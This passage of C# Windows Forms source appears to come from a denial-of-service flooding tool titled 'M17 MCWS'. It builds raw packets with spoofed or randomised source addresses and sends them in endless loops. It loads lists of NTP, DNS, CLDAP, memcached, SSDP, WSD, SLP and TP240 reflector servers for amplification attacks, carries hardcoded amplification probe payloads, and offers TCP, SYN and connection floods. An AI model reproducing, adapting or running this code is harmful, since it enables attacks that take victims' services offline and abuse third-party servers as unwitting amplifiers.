                                    switch (comboBox2.SelectedIndex)
                                    {
                                        case 0:
                                            et = EthernetType.AppleTalk;
                                            break;
                                        case 1:
                                            et = EthernetType.AppleTalkArp;
                                            break;
                                        case 2:
                                            et = EthernetType.IPv4;
                                            break;
                                        case 3:
                                            et = EthernetType.IPv6;
                                            break;
                                        case 4:
                                            et = EthernetType.Arp;
                                            break;
                                        case 5:
                                            et = EthernetType.None;
                                            break;
                                        case 6:
                                            et = EthernetType.ReverseArp;
                                            break;
                                        case 7:
                                            et = EthernetType.WakeOnLan;
                                            break;
                                        case 8:
                                            et = EthernetType.VLanTaggedFrame;
                                            break;
                                        case 9:
                                            et = EthernetType.NovellIpx;
                                            break;
                                        case 10:
                                            et = EthernetType.MacControl;
                                            break;
                                        case 11:
                                            et = EthernetType.CobraNet;
                                            break;
                                        case 12:
                                            et = EthernetType.MplsUnicast;
                                            break;
                                        case 13:
                                            et = EthernetType.MplsMulticast;
                                            break;
                                        case 14:
                                            et = EthernetType.PppoeDiscoveryStage;
                                            break;
                                        case 15:
                                            et = EthernetType.PppoeSessionStage;
                                            break;
                                        case 16:
                                            et = EthernetType.EapOverLan;
                                            break;
                                        case 17:
                                            et = EthernetType.Profinet;
                                            break;
                                        case 18:
                                            et = EthernetType.HyperScsi;
                                            break;
                                        case 19:
                                            et = EthernetType.AtaOverEthernet;
                                            break;
                                        case 20:
                                            et = EthernetType.EtherCat;
                                            break;
                                        case 21:
                                            et = EthernetType.ProviderBridging;
                                            break;
                                        case 22:
                                            et = EthernetType.Avbtp;
                                            break;
                                        case 23:
                                            et = EthernetType.Lldp;
                                            break;
                                        case 24:
                                            et = EthernetType.SercosIII;
                                            break;
                                        case 25:
                                            et = EthernetType.CecOverEthernet;
                                            break;
                                        case 26:
                                            et = EthernetType.HomePlug;
                                            break;
                                        case 27:
                                            et = EthernetType.Ptp;
                                            break;
                                        case 28:
                                            et = EthernetType.CfmOrOam;
                                            break;
                                        case 29:
                                            et = EthernetType.Fcoe;
                                            break;
                                        case 30:
                                            et = EthernetType.VeritasLlt;
                                            break;
                                        case 31:
                                            et = EthernetType.Echo;
                                            break;
                                        case 32:
                                            et = EthernetType.Novell;
                                            break;
                                        case 33:
                                            et = EthernetType.MacSecurity;
                                            break;
                                    }
                                    EthernetPacket ep1 = new EthernetPacket(PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                    ep1.PayloadPacket = ip;
                                    ip.PayloadPacket = udp;
                                    while (true)
                                    {
                                        if (rip.Checked)
                                        {
                                            ip.SourceAddress = randip();
                                        }
                                        if (rp.Checked)
                                        {
                                            udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                            udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                        }
                                        dev.SendPacket(ep1.Bytes);
                                    }
                                }
                                if (custtcp.Checked)
                                {
                                    ip.PayloadPacket = tcp;
                                    tcp.SourcePort = soport;
                                    tcp.DestinationPort = deport;
                                    byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                    tcp.PayloadData = cust;
                                    EthernetType et = new EthernetType();
                                    switch (comboBox2.SelectedIndex)
                                    {
                                        case 0:
                                            et = EthernetType.AppleTalk;
                                            break;
                                        case 1:
                                            et = EthernetType.AppleTalkArp;
                                            break;
                                        case 2:
                                            et = EthernetType.IPv4;
                                            break;
                                        case 3:
                                            et = EthernetType.IPv6;
                                            break;
                                        case 4:
                                            et = EthernetType.Arp;
                                            break;
                                        case 5:
                                            et = EthernetType.None;
                                            break;
                                        case 6:
                                            et = EthernetType.ReverseArp;
                                            break;
                                        case 7:
                                            et = EthernetType.WakeOnLan;
                                            break;
                                        case 8:
                                            et = EthernetType.VLanTaggedFrame;
                                            break;
                                        case 9:
                                            et = EthernetType.NovellIpx;
                                            break;
                                        case 10:
                                            et = EthernetType.MacControl;
                                            break;
                                        case 11:
                                            et = EthernetType.CobraNet;
                                            break;
                                        case 12:
                                            et = EthernetType.MplsUnicast;
                                            break;
                                        case 13:
                                            et = EthernetType.MplsMulticast;
                                            break;
                                        case 14:
                                            et = EthernetType.PppoeDiscoveryStage;
                                            break;
                                        case 15:
                                            et = EthernetType.PppoeSessionStage;
                                            break;
                                        case 16:
                                            et = EthernetType.EapOverLan;
                                            break;
                                        case 17:
                                            et = EthernetType.Profinet;
                                            break;
                                        case 18:
                                            et = EthernetType.HyperScsi;
                                            break;
                                        case 19:
                                            et = EthernetType.AtaOverEthernet;
                                            break;
                                        case 20:
                                            et = EthernetType.EtherCat;
                                            break;
                                        case 21:
                                            et = EthernetType.ProviderBridging;
                                            break;
                                        case 22:
                                            et = EthernetType.Avbtp;
                                            break;
                                        case 23:
                                            et = EthernetType.Lldp;
                                            break;
                                        case 24:
                                            et = EthernetType.SercosIII;
                                            break;
                                        case 25:
                                            et = EthernetType.CecOverEthernet;
                                            break;
                                        case 26:
                                            et = EthernetType.HomePlug;
                                            break;
                                        case 27:
                                            et = EthernetType.Ptp;
                                            break;
                                        case 28:
                                            et = EthernetType.CfmOrOam;
                                            break;
                                        case 29:
                                            et = EthernetType.Fcoe;
                                            break;
                                        case 30:
                                            et = EthernetType.VeritasLlt;
                                            break;
                                        case 31:
                                            et = EthernetType.Echo;
                                            break;
                                        case 32:
                                            et = EthernetType.Novell;
                                            break;
                                        case 33:
                                            et = EthernetType.MacSecurity;
                                            break;
                                    }
                                    EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                    ep1.PayloadPacket = ip;
                                    ip.PayloadPacket = tcp;
                                    while (true)
                                    {
                                        if (rip.Checked)
                                        {
                                            ip.SourceAddress = randip();
                                        }
                                        if (rp.Checked)
                                        {
                                            udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                            udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                        }
                                        dev.SendPacket(ep1.Bytes);
                                    }
                                }
                                break;
                            case 24:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    stuka();
                                }
                                break;
                            case 28:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ud(ipa, ip, soport, deport, f, ep, udp);
                                }
                                break;
                            case 29:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tc(ipa, ip, soport, deport, f, ep, tcp);
                                }
                                break;
                            case 32:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    sf(ipa, ip, soport, deport, f, ep, tcp);
                                }
                                break;
                            case 33:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tclient.Connect(ipe);
                                }
                                break;
                            case 18:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    kasapanos(ipa, ip6, soport, ttl, deport, ep, tcp);
                                }
                                break;
                            case 5:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    slp(ipa, ip, ep, udp, slpservers);
                                }
                                break;
                            case 4:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tp240(ipa, ip, ep, udp, tp240reflect);
                                }
                                break;
                            case 25:
                                a10(ipa, soport, deport, f, ttl);
                                break;
                            case 26:
                                ps24v4(ipa, soport, deport, dnsservers);
                                break;
                        }
                    }
                    if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                    {
                        dev.Open();
                        char quot = '"';
                        byte[] ntpd = Encoding.ASCII.GetBytes("\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00");
                        byte[] ssdpd = Encoding.ASCII.GetBytes($"M - SEARCH\\r\\nST: ssdp:all\\r\\nMAN:\\{quot}ssdp:discover{quot}\\n");
                        byte[] memd = Encoding.ASCII.GetBytes("\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n");
                        byte[] dnsd = Encoding.ASCII.GetBytes("\\xff\\xff\\xff\\xff\\x54\\x53\\x6f\\x75\\x72\\x63\\x65\\x20\\x45\\x6e\\x67\\x69\\x6e\\x65\\x20\\x51\\x75\\x65\\x72\\x79\\x00");
                        byte[] sd = Encoding.ASCII.GetBytes("ffffffff54536f7572636520456e67696e6520517565727900");
                        byte[] cldapd = Encoding.ASCII.GetBytes("\\x30\\x25\\x02\\x01\\x01\\x63\\x20\\x04\\x00\\x0a\\x01\\x00\\x0a\\x01\\x00\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x87\\x0b\\x6f\\x62\\x6a\\x65\\x63\\x74\\x63\\x6c\\x61\\x73\\x73\\x30\\x00");
                        byte[] wsdd = Encoding.ASCII.GetBytes("<Envelope><Body><Probe></Probe></Body></Envelope>");
                        int sport = int.Parse(sportbox.Text);
                        int dport = int.Parse(dportbox.Text);
                        IPAddress sp = IPAddress.Parse(spoofbox.Text);
                        IPEndPoint ipe = new IPEndPoint(ipa, dport);
                        EthernetPacket ep = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), EthernetType.None);
                        IPv6Packet ip6 = new IPv6Packet(sp, ipa);
                        ushort soport = ushort.Parse(sport.ToString());
                        ushort deport = ushort.Parse(dport.ToString());
                        var tcp = new TcpPacket(soport, deport);
                        var udp = new UdpPacket(soport, deport);
                        TcpClient tclient = new TcpClient();
                        int size = int.Parse(sizebox.Text);
                        byte[] f = new byte[int.Parse(sizebox.Text)];
                        ushort ttl = ushort.Parse(ttlbox.Text);
                        string[] ntpservers = System.IO.File.ReadAllLines(@"ntpservers.txt");
                        string[] dnsservers = System.IO.File.ReadAllLines(@"dnsservers.txt");
                        string[] cldapservers = System.IO.File.ReadAllLines(@"cldapservers.txt");
                        string[] memservers = System.IO.File.ReadAllLines(@"memcachedservers.txt");
                        string[] slpservers = System.IO.File.ReadAllLines(@"slpreflectors.txt");
                        string[] sourceservers = System.IO.File.ReadAllLines(@"sourceservers.txt");
                        string[] wreflect = System.IO.File.ReadAllLines(@"wsdreflectors.txt");
                        string[] tp240reflect = System.IO.File.ReadAllLines(@"tp240reflectors.txt");
                        string[] ssdpreflect = System.IO.File.ReadAllLines(@"ssdpreflectors.txt");
                        if (ipa.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            if (comboBox1.SelectedIndex == 13 || comboBox1.SelectedIndex == 14 || comboBox1.SelectedIndex == 15 || comboBox1.SelectedIndex == 16 || comboBox1.SelectedIndex == 17 || comboBox1.SelectedIndex == 18 || comboBox1.SelectedIndex == 21 || comboBox1.SelectedIndex == 25 || comboBox1.SelectedIndex == 28)
                            {
                                ip6.PayloadPacket = tcp;
                                ep.PayloadPacket = ip6;
                            }
                            else if (comboBox1.SelectedIndex == 3 || comboBox1.SelectedIndex == 4 || comboBox1.SelectedIndex == 5 || comboBox1.SelectedIndex == 6 || comboBox1.SelectedIndex == 7 || comboBox1.SelectedIndex == 8 || comboBox1.SelectedIndex == 9 || comboBox1.SelectedIndex == 10 || comboBox1.SelectedIndex == 19 || comboBox1.SelectedIndex == 24)
                            {
                                ip6.PayloadPacket = udp;
                                ep.PayloadPacket = ip6;
                            }
                        }
                        if (comboBox1.SelectedIndex == 19)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                nape(ipa, soport, deport, f, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 15)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                ps(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 17)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                l2023(ipa, soport, deport, size, size, ttl, textBox9.Text);
                            }
                        }
                        if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetwork)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                vx4(dev);
                            }
                        }
                        if (comboBox1.SelectedIndex == 20 && ipa.AddressFamily == AddressFamily.InterNetworkV6)
                        {
                            for (int i = 0; i < trackBar1.Value; i++)
                            {
                                vx6(dev);
                            }
                        }
                        switch (comboBox1.SelectedIndex)
                        {
                            case 26:
                                ps24v6(ipa, soport, deport, dnsservers);
                                break;
                            case 3:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    mem(ipa, ip6, memd, ep, udp, memservers);
                                    ntp(ipa, ip6, memd, ep, udp, ntpservers);
                                    wsd(ipa, ip6, memd, ep, udp, wreflect);
                                    dns(ipa, ip6, memd, ep, udp, dnsservers);
                                    cldap(ipa, ip6, memd, ep, udp, cldapservers);
                                    ssdp(ipa, ip6, memd, ep, udp, ssdpreflect);
                                    src(ipa, ip6, memd, ep, udp, sourceservers);
                                }
                                break;
                            case 6:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    mem(ipa, ip6, memd, ep, udp, memservers);
                                }
                                break;
                            case 7:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ntp(ipa, ip6, ntpd, ep, udp, ntpservers);
                                }
                                break;
                            case 8:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    wsd(ipa, ip6, wsdd, ep, udp, wreflect);
                                }
                                break;
                            case 9:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    dns(ipa, ip6, dnsd, ep, udp, dnsservers);
                                }
                                break;
                            case 10:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    cldap(ipa, ip6, cldapd, ep, udp, cldapservers);
                                }
                                break;
                            case 11:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ssdp(ipa, ip6, ssdpd, ep, udp, ssdpreflect);
                                }
                                break;
                            case 12:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    src(ipa, ip6, sd, ep, udp, sourceservers);
                                }
                                break;
                            case 16:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tos1(ipa, soport, deport, size, size, ttl, textBox9.Text);
                                }
                                break;
                            case 22:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    gmod(ipa, ip6, soport, sd, ep, udp, sourceservers);
                                }
                                break;
                            case 23:
                                Random r = new Random();
                                if (custudp.Checked)
                                {
                                    ip6.PayloadPacket = tcp;
                                    tcp.SourcePort = soport;
                                    tcp.DestinationPort = deport;
                                    byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                    tcp.PayloadData = cust;
                                    EthernetType et = new EthernetType();
                                    switch (comboBox2.SelectedIndex)
                                    {
                                        case 0:
                                            et = EthernetType.AppleTalk;
                                            break;
                                        case 1:
                                            et = EthernetType.AppleTalkArp;
                                            break;
                                        case 2:
                                            et = EthernetType.IPv4;
                                            break;
                                        case 3:
                                            et = EthernetType.IPv6;
                                            break;
                                        case 4:
                                            et = EthernetType.Arp;
                                            break;
                                        case 5:
                                            et = EthernetType.None;
                                            break;
                                        case 6:
                                            et = EthernetType.ReverseArp;
                                            break;
                                        case 7:
                                            et = EthernetType.WakeOnLan;
                                            break;
                                        case 8:
                                            et = EthernetType.VLanTaggedFrame;
                                            break;
                                        case 9:
                                            et = EthernetType.NovellIpx;
                                            break;
                                        case 10:
                                            et = EthernetType.MacControl;
                                            break;
                                        case 11:
                                            et = EthernetType.CobraNet;
                                            break;
                                        case 12:
                                            et = EthernetType.MplsUnicast;
                                            break;
                                        case 13:
                                            et = EthernetType.MplsMulticast;
                                            break;
                                        case 14:
                                            et = EthernetType.PppoeDiscoveryStage;
                                            break;
                                        case 15:
                                            et = EthernetType.PppoeSessionStage;
                                            break;
                                        case 16:
                                            et = EthernetType.EapOverLan;
                                            break;
                                        case 17:
                                            et = EthernetType.Profinet;
                                            break;
                                        case 18:
                                            et = EthernetType.HyperScsi;
                                            break;
                                        case 19:
                                            et = EthernetType.AtaOverEthernet;
                                            break;
                                        case 20:
                                            et = EthernetType.EtherCat;
                                            break;
                                        case 21:
                                            et = EthernetType.ProviderBridging;
                                            break;
                                        case 22:
                                            et = EthernetType.Avbtp;
                                            break;
                                        case 23:
                                            et = EthernetType.Lldp;
                                            break;
                                        case 24:
                                            et = EthernetType.SercosIII;
                                            break;
                                        case 25:
                                            et = EthernetType.CecOverEthernet;
                                            break;
                                        case 26:
                                            et = EthernetType.HomePlug;
                                            break;
                                        case 27:
                                            et = EthernetType.Ptp;
                                            break;
                                        case 28:
                                            et = EthernetType.CfmOrOam;
                                            break;
                                        case 29:
                                            et = EthernetType.Fcoe;
                                            break;
                                        case 30:
                                            et = EthernetType.VeritasLlt;
                                            break;
                                        case 31:
                                            et = EthernetType.Echo;
                                            break;
                                        case 32:
                                            et = EthernetType.Novell;
                                            break;
                                        case 33:
                                            et = EthernetType.MacSecurity;
                                            break;
                                    }
                                    EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                    ep1.PayloadPacket = ip6;
                                    ip6.PayloadPacket = udp;
                                    while (true)
                                    {
                                        if (rip.Checked)
                                        {
                                            ip6.SourceAddress = randip();
                                        }
                                        if (rp.Checked)
                                        {
                                            udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                            udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                        }
                                        dev.SendPacket(ep1.Bytes);
                                    }
                                }
                                if (custtcp.Checked)
                                {
                                    ip6.PayloadPacket = tcp;
                                    tcp.SourcePort = soport;
                                    tcp.DestinationPort = deport;
                                    byte[] cust = Encoding.ASCII.GetBytes(cpayload.Text);
                                    tcp.PayloadData = cust;
                                    EthernetType et = new EthernetType();
                                    switch (comboBox2.SelectedIndex)
                                    {
                                        case 0:
                                            et = EthernetType.AppleTalk;
                                            break;
                                        case 1:
                                            et = EthernetType.AppleTalkArp;
                                            break;
                                        case 2:
                                            et = EthernetType.IPv4;
                                            break;
                                        case 3:
                                            et = EthernetType.IPv6;
                                            break;
                                        case 4:
                                            et = EthernetType.Arp;
                                            break;
                                        case 5:
                                            et = EthernetType.None;
                                            break;
                                        case 6:
                                            et = EthernetType.ReverseArp;
                                            break;
                                        case 7:
                                            et = EthernetType.WakeOnLan;
                                            break;
                                        case 8:
                                            et = EthernetType.VLanTaggedFrame;
                                            break;
                                        case 9:
                                            et = EthernetType.NovellIpx;
                                            break;
                                        case 10:
                                            et = EthernetType.MacControl;
                                            break;
                                        case 11:
                                            et = EthernetType.CobraNet;
                                            break;
                                        case 12:
                                            et = EthernetType.MplsUnicast;
                                            break;
                                        case 13:
                                            et = EthernetType.MplsMulticast;
                                            break;
                                        case 14:
                                            et = EthernetType.PppoeDiscoveryStage;
                                            break;
                                        case 15:
                                            et = EthernetType.PppoeSessionStage;
                                            break;
                                        case 16:
                                            et = EthernetType.EapOverLan;
                                            break;
                                        case 17:
                                            et = EthernetType.Profinet;
                                            break;
                                        case 18:
                                            et = EthernetType.HyperScsi;
                                            break;
                                        case 19:
                                            et = EthernetType.AtaOverEthernet;
                                            break;
                                        case 20:
                                            et = EthernetType.EtherCat;
                                            break;
                                        case 21:
                                            et = EthernetType.ProviderBridging;
                                            break;
                                        case 22:
                                            et = EthernetType.Avbtp;
                                            break;
                                        case 23:
                                            et = EthernetType.Lldp;
                                            break;
                                        case 24:
                                            et = EthernetType.SercosIII;
                                            break;
                                        case 25:
                                            et = EthernetType.CecOverEthernet;
                                            break;
                                        case 26:
                                            et = EthernetType.HomePlug;
                                            break;
                                        case 27:
                                            et = EthernetType.Ptp;
                                            break;
                                        case 28:
                                            et = EthernetType.CfmOrOam;
                                            break;
                                        case 29:
                                            et = EthernetType.Fcoe;
                                            break;
                                        case 30:
                                            et = EthernetType.VeritasLlt;
                                            break;
                                        case 31:
                                            et = EthernetType.Echo;
                                            break;
                                        case 32:
                                            et = EthernetType.Novell;
                                            break;
                                        case 33:
                                            et = EthernetType.MacSecurity;
                                            break;
                                    }
                                    EthernetPacket ep1 = new EthernetPacket(admac, PhysicalAddress.Parse("ff:ff:ff:ff:ff:ff"), et);
                                    ep1.PayloadPacket = ip6;
                                    ip6.PayloadPacket = tcp;
                                    while (true)
                                    {
                                        if (rip.Checked)
                                        {
                                            ip6.SourceAddress = randip();
                                        }
                                        if (rp.Checked)
                                        {
                                            udp.SourcePort = ushort.Parse(r.Next(0, 65535).ToString());
                                            udp.DestinationPort = ushort.Parse(r.Next(0, 65535).ToString());
                                        }
                                        dev.SendPacket(ep1.Bytes);
                                    }
                                }
                                break;
                            case 24:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    stuka();
                                }
                                break;
                            case 28:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    ud(ipa, ip6, soport, deport, f, ep, udp);
                                }
                                break;
                            case 29:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tc(ipa, ip6, soport, deport, f, ep, tcp);
                                }
                                break;
                            case 32:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    sf(ipa, ip6, soport, deport, f, ep, tcp);
                                }
                                break;
                            case 33:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tclient.Connect(ipe);
                                }
                                break;
                            case 19:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    kasapanos(ipa, ip6, soport, ttl, deport, ep, tcp);
                                }
                                break;
                            case 5:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    slp(ipa, ip6, ep, udp, slpservers);
                                }
                                break;
                            case 4:
                                for (int i = 0; i < trackBar1.Value; i++)
                                {
                                    tp240(ipa, ip6, ep, udp, tp240reflect);
                                }
                                break;
                            case 25:
                                a10(ipa, soport, deport, f, ttl);
                                break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            sizebox.Text = "1024";
            sportbox.Text = "53";
            dportbox.Text = "53";
            ttlbox.Text = "250";
            timeoutbox.Text = "9001";

        }

        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            dev = cdl[comboBox3.SelectedIndex];
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.ShowDialog();
            a10s = File.ReadAllLines(ofd.FileName);
        }
    }
}